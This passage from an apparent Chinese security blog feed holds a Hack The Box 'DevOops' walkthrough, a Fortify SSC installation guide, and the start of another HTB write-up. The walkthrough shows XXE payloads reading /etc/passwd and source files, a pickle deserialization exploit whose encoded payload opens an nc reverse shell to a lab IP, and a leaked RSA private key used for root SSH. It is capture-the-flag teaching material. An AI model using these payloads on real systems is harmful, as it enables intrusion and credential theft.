    <content><![CDATA[<style>.irqvisjnbkip{zoom:50%;}</style><img src="/Hackthebox/htb/htb-devoops/c74d84352f781ad5c7a4c35c0c3aa0ac.png" class="irqvisjnbkip">

<span id="more"></span>

<table>
<thead>
<tr>
<th align="left">OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Linux</td>
<td align="left">Medium</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.10.91 <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sC</span>  -p- <span class="token parameter variable">-T4</span> --min-rate <span class="token number">1000</span> <span class="token parameter variable">-e</span> tun0 
Starting Nmap <span class="token number">7.95</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-02-21 <span class="token number">22</span>:09 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.91
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.19s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65533</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT     STATE SERVICE VERSION
<span class="token number">22</span>/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">7</span>.2p2 Ubuntu 4ubuntu2.4 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">2048</span> <span class="token number">42</span>:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">5000</span>/tcp <span class="token function">open</span>  http    Gunicorn <span class="token number">19.7</span>.1
<span class="token operator">|</span>_http-title: Site doesn't have a title <span class="token punctuation">(</span>text/html<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span>utf-8<span class="token punctuation">)</span>.
<span class="token operator">|</span>_http-server-header: gunicorn/19.7.1
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">130.88</span> seconds
</code></pre>

<p>开放了两个端口22(SSH)和5000(HTTP)，添加本地域名解析到hosts文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'10.10.10.91 devoops.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts </code></pre>

<h3 id="目录Fuzzing"><a href="#目录Fuzzing" class="headerlink" title="目录Fuzzing"></a>目录Fuzzing</h3><p>使用ffuf 工具对目录进行猜解，发现&#x2F;upload、&#x2F;feed、&#x2F;newpost</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ ffuf <span class="token parameter variable">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ <span class="token parameter variable">-u</span> http://devoops.htb:5000/FUZZ  <span class="token parameter variable">-t</span> <span class="token number">100</span> <span class="token parameter variable">-ic</span>

        /<span class="token string">'___\  /'</span>___<span class="token punctuation">\</span>           /'___<span class="token punctuation">\</span>       
       /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/ /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/  __  __  /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/       
       <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span><span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>      
        <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/ <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/      
         <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>   <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>  <span class="token punctuation">\</span> <span class="token punctuation">\</span>____/  <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>       
          <span class="token punctuation">\</span>/_/    <span class="token punctuation">\</span>/_/   <span class="token punctuation">\</span>/___/    <span class="token punctuation">\</span>/_/       

       v2.1.0-dev
________________________________________________

 :: Method           <span class="token builtin class-name">:</span> GET
 :: URL              <span class="token builtin class-name">:</span> http://devoops.htb:5000/FUZZ
 :: Wordlist         <span class="token builtin class-name">:</span> FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
 :: Calibration      <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
 :: Timeout          <span class="token builtin class-name">:</span> <span class="token number">10</span>
 :: Threads          <span class="token builtin class-name">:</span> <span class="token number">100</span>
 :: Matcher          <span class="token builtin class-name">:</span> Response status: <span class="token number">200</span>-299,301,302,307,401,403,405,500
________________________________________________

                        <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">285</span>, Words: <span class="token number">43</span>, Lines: <span class="token number">1</span>, Duration: 297ms<span class="token punctuation">]</span>
upload                  <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">347</span>, Words: <span class="token number">44</span>, Lines: <span class="token number">1</span>, Duration: 167ms<span class="token punctuation">]</span>
feed                    <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">546263</span>, Words: <span class="token number">6030</span>, Lines: <span class="token number">1816</span>, Duration: 299ms<span class="token punctuation">]</span>
newpost                 <span class="token punctuation">[</span>Status: <span class="token number">405</span>, Size: <span class="token number">178</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">5</span>, Duration: 109ms<span class="token punctuation">]</span></code></pre>

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问 &#x2F;upload 在上传文件的地方可以看到xml格式</p>
<img src="/Hackthebox/htb/htb-devoops/image-20250221224346237.png" class="" title="upload">

<p>构造一个简单xml测试，可以看到Doe被解析出来</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">replace</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">example</span> <span class="token attr-name">"Doe"</span><span class="token punctuation">></span></span> </span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Author</span><span class="token punctuation">></span></span>Lee<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Author</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Subject</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Subject</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Content</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&example;">&amp;example;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Content</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></code></pre>

<img src="/Hackthebox/htb/htb-devoops/image-20250221225731266.png" class="" title="xxe">

<p>修改xml 读取&#x2F;etc&#x2F;passwd 文件</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">replace</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY example SYSTEM "file:///etc/passwd"> </span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Author</span><span class="token punctuation">></span></span>Lee<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Author</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Subject</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Subject</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Content</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&example;">&amp;example;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Content</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></code></pre>

<img src="/Hackthebox/htb/htb-devoops/image-20250221230704068.png" class="" title="&#x2F;etc&#x2F;passwd">

<p>访问网站首页可以看到</p>
<p>修改xml读取feed.py</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">replace</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY example SYSTEM "file:////home/roosa/deploy/src/feed.py"> </span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Author</span><span class="token punctuation">></span></span>Lee<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Author</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Subject</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Subject</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Content</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&example;">&amp;example;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Content</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></code></pre>

<p>分析feed.py 文件，提交POST请求时候调用了pickle进行反序列化</p>
<img src="/Hackthebox/htb/htb-devoops/image-20250221233304683.png" class="" title="读取feed.py">

<p>利用pickle反序列化漏洞，构造一个反弹shell，提交POST请求包，可成功接收到shell</p>
<pre class="language-python" data-language="python"><code class="language-python">$ python2                                               
Python <span class="token number">2.7</span><span class="token number">.18</span> <span class="token punctuation">(</span>default<span class="token punctuation">,</span> Aug  <span class="token number">1</span> <span class="token number">2022</span><span class="token punctuation">,</span> <span class="token number">06</span><span class="token punctuation">:</span><span class="token number">23</span><span class="token punctuation">:</span><span class="token number">55</span><span class="token punctuation">)</span> 
<span class="token punctuation">[</span>GCC <span class="token number">12.1</span><span class="token number">.0</span><span class="token punctuation">]</span> on linux2
Type <span class="token string">"help"</span><span class="token punctuation">,</span> <span class="token string">"copyright"</span><span class="token punctuation">,</span> <span class="token string">"credits"</span> <span class="token keyword">or</span> <span class="token string">"license"</span> <span class="token keyword">for</span> more information<span class="token punctuation">.</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> pickle
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> os
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">from</span> base64 <span class="token keyword">import</span> urlsafe_b64encode
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">class</span> <span class="token class-name">exp</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>   		cmd <span class="token operator">=</span> <span class="token string">"反弹shell"</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>         <span class="token keyword">return</span> os<span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
<span class="token operator">>></span><span class="token operator">></span> urlsafe_b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token string">'Y3Bvc2l4CnN5c3RlbQpwMAooUydybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC4xMC4xNi4zMCA4MDAxID4vdG1wL2YnCnAxCnRwMgpScDMKLg=='</span>
</code></pre>

<img src="/Hackthebox/htb/htb-devoops/image-20250221235447552.png" class="" title="Getshell">

<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>在&#x2F;home&#x2F;roosa&#x2F;work&#x2F;blogfeed 目录下，使用git log 查看commit记录可以找到一条关于密钥的记录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">    reverted accidental commit with proper key
commit d387abf63e05c9628a59195cec9311751bdb283f
Author: Roosa Hakkerson <span class="token operator">&lt;</span>roosa@solita.fi<span class="token operator">></span>
Date:   Mon Mar <span class="token number">19</span> 09:32:03 <span class="token number">2018</span> <span class="token parameter variable">-0400</span></code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> <span class="token function">diff</span> d387abf63e05c9628a59195cec9311751bdb283f
<span class="token operator">&lt;</span>ed$ <span class="token function">git</span> <span class="token function">diff</span> d387abf63e05c9628a59195cec9311751bdb283f                       
WARNING: terminal is not fully functional
-  <span class="token punctuation">(</span>press RETURN<span class="token punctuation">)</span>
<span class="token function">diff</span> <span class="token parameter variable">--git</span> a/resources/integration/authcredentials.key b/resources/integration/a
uthcredentials.key
index 44c981f<span class="token punctuation">..</span>f4bde49 <span class="token number">100644</span>
--- a/resources/integration/authcredentials.key
+++ b/resources/integration/authcredentials.key
@@ -1,28 +1,27 @@
 -----BEGIN RSA PRIVATE KEY-----
-MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
-8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
-vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK
-nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+
-CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c
-F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH
-uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL
-gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD
-k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy
<span class="token parameter variable">-NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM</span>
-HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa
-2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB
-GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG
-jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41
-IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw
-+XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW
-7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj
-Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS
-iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7
-VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX
-S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6
-md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie
<span class="token parameter variable">-LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz</span>
-oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
<span class="token parameter variable">-LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE</span><span class="token operator">=</span>
-----END RSA PRIVATE KEY-----
</code></pre>

<p>提取密钥保存到本地，使用ssh 登录root账号</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK
nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+
CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c
F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH
uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL
gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD
k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy
NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM
HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa
2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB
GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG
jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41
IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw
+XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW
7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj
Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS
iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7
VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX
S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6
md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie
LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz
oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
<span class="token assign-left variable">LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE</span><span class="token operator">=</span>
-----END RSA PRIVATE KEY-----
</code></pre>

<img src="/Hackthebox/htb/htb-devoops/image-20250222085122095.png" class="" title="Getshell">

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">&#x2F;home&#x2F;roosa&#x2F;user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">&#x2F;root&#x2F;root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>XXE</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>Fortify SSC 24.X 搭建</title>
    <url>/DevSecOps/tools/fortifyssc/</url>
    <content><![CDATA[<blockquote>
<p>Fortify Software Security Center 是一款基于浏览器的产品，可在整个软件开发生命周期中提供一组功能，以自动检测应用程序中的安全漏洞。它通过提供来自 OpenText™ Fortify Static Code Analyzer、OpenText™ Fortify ScanCentral SAST、OpenText™ Fortify ScanCentral DAST 和 Sonatype 的关联数据，帮助安全和开发团队协同工作，通过其协作在线环境快速准确地解决安全漏洞。</p>
</blockquote>
<span id="more"></span>

<img src="/DevSecOps/tools/fortifyssc/DraggedImage.png" class="">

<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul>
<li>系统：Windows Server 2022</li>
<li>软件： Apache Tomcat 9.0.x 、 JDK 17、Fortify Software Security Center 24.2</li>
<li>数据库： MySQL 8.0.x </li>
<li>账号： 管理员权限</li>
</ul>
<h3 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h3><h4 id="安装并配置JDK环境"><a href="#安装并配置JDK环境" class="headerlink" title="安装并配置JDK环境"></a>安装并配置JDK环境</h4><p>安装JDK17，配置JDK环境变量，打开命令行输入 java、javac、java - version均有相应回显</p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-1.png" class="" title="jdk环境">

<h4 id="安装并配置MySQL"><a href="#安装并配置MySQL" class="headerlink" title="安装并配置MySQL"></a>安装并配置MySQL</h4><p>安装MySQL，选择Custom</p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-2.png" class="" title="安装Mysql">



<p>安装完成后修改my.ini文件(必需)</p>
<p>在<code>[mysqld]</code>和<code>[mysqldump]</code>部分中，均设置<code>max\_allowed\_packet</code>为1G,如果没有<code>[mysqldump]</code>,则需要自己创建</p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-3.png" class="" title="my.ini">
<p>在<code>[mysqld]</code>部分修改</p>
<table>
<thead>
<tr>
<th>选项</th>
<th>值</th>
</tr>
</thead>
<tbody><tr>
<td>default_storage_engine</td>
<td>INNODB</td>
</tr>
<tr>
<td>innodb_buffer_pool_size</td>
<td>512M</td>
</tr>
<tr>
<td>innodb_lock_wait_timeout</td>
<td>300</td>
</tr>
<tr>
<td>innodb_log_file_size</td>
<td>512M</td>
</tr>
<tr>
<td>max_allowed_packetv</td>
<td>1G</td>
</tr>
<tr>
<td>sql-mode</td>
<td>“TRADITIONAL”</td>
</tr>
</tbody></table>
<p>保存配置，命令行重启服务（要管理员权限）</p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-4.png" class="" title="重启mysql服务">

<h4 id="导入官方提供的SQL脚本"><a href="#导入官方提供的SQL脚本" class="headerlink" title="导入官方提供的SQL脚本"></a>导入官方提供的SQL脚本</h4><p>新建数据库并导入SQL脚本：数据库字符集设置为<code>utf8\\uft8\_bin</code></p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-5.png" class="" title="新建数据库">



<p>禁用安全模式,然后重新连接数据库</p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-6.png" class="" title="禁用安全模式">
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-7.png" class="" title="导入sql脚本">

<h4 id="安装Tomcat"><a href="#安装Tomcat" class="headerlink" title="安装Tomcat"></a>安装Tomcat</h4><p>使用安装版安装Tomcat，选择full</p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-8.png" class="" title="tomcat">
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-9.png" class="" title="tomcat">

<h4 id="配置Tomcat"><a href="#配置Tomcat" class="headerlink" title="配置Tomcat"></a>配置Tomcat</h4><p>清空webapps目录，并放入ssc.war</p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-10.png" class="" title="webapps">
<p>进入<code>Apache Software Foundation\\Tomcat 9.0\\bin</code>, 点开tomcat9w –&gt; Java –&gt; Java options 添加<code>-Dfortify.home=E:\SSC\fortify </code>  –&gt; 修改内存(初始化4G，最大推荐16以上) –&gt; 应用, 然后启动Tomcat</p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-11.png" class="">
<style>.tuglfjxhzeun{zoom:150%;}</style><img src="/DevSecOps/tools/fortifyssc/DraggedImage-12.png" class="tuglfjxhzeun" alt="修改配置">
<style>.isvwtdccskqx{zoom:150%;}</style><img src="/DevSecOps/tools/fortifyssc/DraggedImage-13.png" class="isvwtdccskqx">

<h4 id="安装SSC"><a href="#安装SSC" class="headerlink" title="安装SSC"></a>安装SSC</h4><p> 打开浏览器访问 <a href="http://127.0.0.1:8080/ssc/">http://127.0.0.1:8080/ssc/</a></p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-14.png" class="" title="访问SSC">

<p>打开上面配置的那个fortify home的路径，有个init.token文件，复制内容贴进去</p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-15.png" class="" title="获取token">
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-16.png" class="" title="登录">

<p>上传License</p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-17.png" class="" title="上传许可证">
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-18.png" class="" title="默认配置">



<p>配置数据</p>
<p><code>jdbc:mysql://ip:3306/sscsessionVariables=collation_connection=utf8_bin&amp;rewriteBatchedStatements=true</code></p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-19.png" class="" title="配置数据库">

<p>上传种子包，需要按顺序上传</p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-20.png" class="" title="upload seed">
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-21.png" class="" title="上传成功">

<p>重启Tomcat</p>
<img src="/DevSecOps/tools/fortifyssc/DraggedImage-22.png" class="" title="重启服务">]]></content>
      <categories>
        <category>DevSecOps</category>
      </categories>
      <tags>
        <tag>企业安全建设</tag>
        <tag>DevSecOps</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Jerry</title>
    <url>/Hackthebox/htb/htb-jerry/</url>
    <content><![CDATA[<style>.hxjulpxtqeyk{zoom:50%;}</style><img src="/Hackthebox/htb/htb-jerry/59f03a24178dbb2bdc94968c201e21f8.png" class="hxjulpxtqeyk">

<span id="more"></span>

<table>
<thead>
<tr>
<th>OS</th>
<th>Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Windows</td>
<td>Easy</td>
</tr>
</tbody></table>
